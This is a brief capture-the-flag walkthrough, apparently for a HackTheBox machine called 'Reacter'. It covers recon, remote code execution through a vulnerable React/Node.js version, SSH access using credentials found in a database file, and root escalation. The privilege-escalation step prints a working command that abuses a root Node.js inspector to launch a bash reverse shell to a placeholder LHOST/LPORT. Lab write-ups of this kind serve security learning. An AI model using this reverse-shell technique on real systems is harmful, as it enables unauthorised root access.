
# Reacter on HTB

## Recon
nmap scan first

see port 3000? react flight protocol

# Initial Access

navigate to the web page (port 3000), see the nodejs version running? its vulnerable to ract2shell

# Lateral Movement

take a look at the db file within our directory once rce is established

obtain ssh shell with creds found in the reactor.db


# PrivEscal
Notice the nodejs running as root in ps aux?

use nodejs inspector to initiate a reverse shell as root;
```node
$ node inspect 127.0.0.1:9229

connecting to 127.0.0.1:9229 ... ok
debug> exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/LHOST/LPORT 0>&1\"').toString()")
```
